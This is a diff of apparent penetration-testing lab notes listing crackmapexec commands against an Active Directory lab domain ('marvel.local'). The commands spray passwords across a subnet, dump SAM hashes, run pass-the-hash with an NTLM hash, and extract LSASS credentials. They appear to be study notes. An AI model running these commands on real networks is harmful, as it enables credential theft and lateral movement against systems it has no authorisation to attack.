@@ -36,10 +36,7 @@ crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
 
 
 
-
-
-
-
+-- Pass Attacks --
 
 crackmapexec smb 192.168.57.0/24 -u administrator -d marvel.local -p Password1
 crackmapexec smb 192.168.57.0/24 -u administrator -d MARVEL -p Password1 --sam
@@ -55,4 +52,15 @@ crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c0728
 crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth -M lsassy
 
 crackmapexec smb -L
-cmedb
+
+cmedb >
+cmedb > help
+cmedb > hosts
+cmedb > creds
+
+
+
+
+
+
+
